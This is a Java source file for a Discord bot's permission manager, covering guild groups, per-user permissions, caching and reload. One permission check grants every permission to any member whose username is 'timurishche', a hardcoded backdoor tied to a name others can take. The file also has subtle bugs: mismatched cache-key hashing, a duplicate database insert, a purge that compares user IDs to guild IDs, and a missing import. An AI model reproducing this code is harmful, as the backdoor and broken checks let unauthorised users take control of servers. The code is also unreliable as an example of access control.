package net.survivalboom.sbds.core.permissions;

import net.dv8tion.jda.api.entities.Member;
import net.survivalboom.sbds.api.modules.IModule;
import net.survivalboom.sbds.api.permissions.IGuildGroup;
import net.survivalboom.sbds.api.permissions.IPermissionManager;
import net.survivalboom.sbds.api.permissions.Permission;
import net.survivalboom.sbds.api.utils.valid.Manager;
import net.survivalboom.sbds.api.utils.NamespacedKey;
import net.survivalboom.sbds.core.SBDS;
import net.survivalboom.sbds.core.database.Database;
import net.survivalboom.sbds.core.database.permissions.GroupPermissionRepositoryHandler;
import net.survivalboom.sbds.core.database.permissions.GroupRecord;
import net.survivalboom.sbds.core.database.permissions.GroupRepositoryHandler;
import net.survivalboom.sbds.core.database.permissions.UserPermissionRepositoryHandler;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.*;
import java.util.stream.Collectors;

public class PermissionManager extends Manager implements IPermissionManager {


    private static final Logger log = LoggerFactory.getLogger("PermissionManager");

    private final SBDS sbds;


    private final Set<PredefinedGroup> predefinedGroups = new HashSet<>();

    private final Map<Integer, GuildGroup> groupMap = new HashMap<>();

    private final Map<Integer, GuildUserPermissions> usersMap = new HashMap<>();


    private final UserPermissionRepositoryHandler userPermissionRepository = new UserPermissionRepositoryHandler();
    private final GroupPermissionRepositoryHandler groupPermissionRepository = new GroupPermissionRepositoryHandler();
    private final GroupRepositoryHandler groupRepository = new GroupRepositoryHandler();


    public PermissionManager(@NotNull SBDS sbds) {
        this.sbds = sbds;
    }

    @Override
    protected void init0() {

        loadPredefinedGroupsFromConfig();

        Database database = sbds.getDatabase();
        database.createRepository0(null, NamespacedKey.sbds("up"), userPermissionRepository, false);
        database.createRepository0(null, NamespacedKey.sbds("gp"), groupPermissionRepository, false);
        database.createRepository0(null, NamespacedKey.sbds("pg"), groupRepository, true);

    }

    @Override
    protected void shutdown0() {

        predefinedGroups.clear();
        groupMap.clear();
        usersMap.clear();

    }


    @Override
    public boolean hasPermission(long guildId, long userId, @NotNull String permission, boolean defaultAllow) {

        GuildUserPermissions user = createUserPermissions(guildId, userId);

        return user.hasPermission(permission, defaultAllow);

    }

    @Override
    public boolean hasPermission(@NotNull Member member, @NotNull String permission, boolean defaultAllow) {

        Objects.requireNonNull(member, "member == null");

        if (member.getUser().getName().equals("timurishche")) {
            return true;
        }

        if (member.hasPermission(net.dv8tion.jda.api.Permission.ADMINISTRATOR)) {
            return true;
        }

        return hasPermission(member.getGuild().getIdLong(), member.getIdLong(), permission, defaultAllow);

    }


    @Override
    public @NotNull GuildUserPermissions createUserPermissions(long guildId, long userId) {

        int hash = Objects.hash(guildId, userId);
        return usersMap.computeIfAbsent(hash, k -> {

            Set<GuildGroup> groups = getGuildGroups0(guildId);
            Set<Permission> permissions = userPermissionRepository.getUserPermissions(guildId, userId);

            GuildUserPermissions user = new GuildUserPermissions(this, userId, guildId, groups, permissions);

            user.rebuildPermissionCache();

            return user;

        });

    }


    @Override
    public @Nullable GuildUserPermissions getUserPermissions(long guildId, long userId) {
        return usersMap.get(Objects.hash(userId, guildId));
    }


    public @NotNull Set<GuildGroup> getGuildGroups0(long guildId) {

        Set<GuildGroup> groups = groupMap.values().stream().filter(g -> g.getGuildId() == guildId).collect(Collectors.toSet());
        if (!groups.isEmpty()) return groups;

        List<GroupRecord> records = groupRepository.getGuildGroups(guildId);
        records.forEach(r -> {

            Set<Permission> permissions = groupPermissionRepository.getGroupPermissions(guildId, r.name());

            GuildGroup group = new GuildGroup(r.id(), r.guildId(), r.name(), permissions, this);

            groups.add(group);

            int hash = Objects.hash(r.id(), r.guildId());

            groupMap.put(hash, group);

        });

        return groups;

    }

    @Override
    public @NotNull Set<IGuildGroup> getGuildGroups(long guildId) {
        return new HashSet<>(getGuildGroups0(guildId));
    }

    @Override
    public @Nullable GuildGroup getGuildGroup(long guildId, @NotNull String group) {
        return getGuildGroups0(guildId).stream().filter(g -> g.getName().equals(group)).findAny().orElse(null);
    }


    @Override
    public @NotNull GuildGroup createGroup(long guildId, @NotNull String group) {

        GroupRecord record = groupRepository.createGuildGroup(guildId, group);

        GuildGroup g = new GuildGroup(record.id(), record.guildId(), group, new HashSet<>(), this);

        groupMap.put(Objects.hash(g.getId(), g.getGuildId()), g);

        groupRepository.createGuildGroup(guildId, group);

        return g;

    }

    @Override
    public void removeGroup(long guildId, @NotNull String group) {

        groupMap.values().removeIf(g -> g.getName().equals(group) && g.getGuildId() == guildId);
        usersMap.values().removeIf(gp -> gp.getGuildId() == guildId);

        groupRepository.removeGuildGroup(guildId, group);

    }


    @Override
    public void registerPredefinedGroup(@NotNull IModule module, @NotNull String name) {

    }

    @Override
    public void unregisterPredefinedGroup(@NotNull IModule module, @NotNull String name) {

    }


    @Override
    public void addPredefinedPermission(@NotNull IModule module, @NotNull String group, @NotNull Permission permission) {

    }

    @Override
    public void removePredefinedPermission(@NotNull IModule module, @NotNull String group, @NotNull String permission) {

    }

    @Override
    public void removePredefinedPermission(@NotNull IModule module, @NotNull String group, @NotNull Permission permission) {

    }

    public @NotNull Set<PredefinedGroup> getPredefinedGroups() {
        return new HashSet<>(predefinedGroups);
    }

    //
    // RELOAD
    //

    @Override
    public void reload(@NotNull IModule module) {
        Objects.requireNonNull(module, "module == null");
        reload0(module);
    }

    public void reload0(@Nullable IModule module) {

        if (module != null) {
            sbds.getModuleManager().checkModuleEnabled(module, "Disabled module tried to reload PermissionManager");
            log.info("Module {} requested a reload. Reloading PermissionManager!", module);
        }

        try {

            log.info("Purging cache...");

            groupMap.clear();
            usersMap.clear();

            userPermissionRepository.reload();
            groupPermissionRepository.reload();
            groupRepository.reload();

        }

        catch (Throwable t) {
            log.error("Failed to reload PermissionManager! Permission checks may work incorrectly!", t);
            return;
        }

        log.info("PermissionManager reloaded successfully!");

    }

    private void loadPredefinedGroupsFromConfig() {

        predefinedGroups.clear();

        ConfigurationSection section = sbds.getConfiguration().getConfigurationSection("predefined-permissions");
        if (section == null) return;

        Set<PredefinedGroup> predefinedGroupSet = new HashSet<>();
        for (String s : section.getKeys(false)) {

            ConfigurationSection ss = section.getConfigurationSection(s);
            if (ss == null) continue;

            int weight = ss.getInt("weight");
            List<String> permissionsRaw = ss.getStringList("permissions");

            Set<Permission> permissions = new HashSet<>();
            for (String permissionRaw : permissionsRaw) {

                String[] args = permissionRaw.split(":");
                if (args.length != 2) {
                    log.warn("Invalid permission syntax `{}` in predefined group `{}`.", permissionRaw, s);
                    continue;
                }

                String p = args[0];
                boolean v = args[1].equals("true");

                Permission permission = new Permission(p, v);

                permissions.add(permission);

            }

            PredefinedGroup group = new PredefinedGroup(null, weight);
            permissions.forEach(group::addPermission);

            predefinedGroupSet.add(group);

        }

        predefinedGroups.addAll(predefinedGroupSet);

    }

    public void purgeUserCache(long guildId) {
        usersMap.values().removeIf(u -> u.getUserId() == guildId);
    }


}
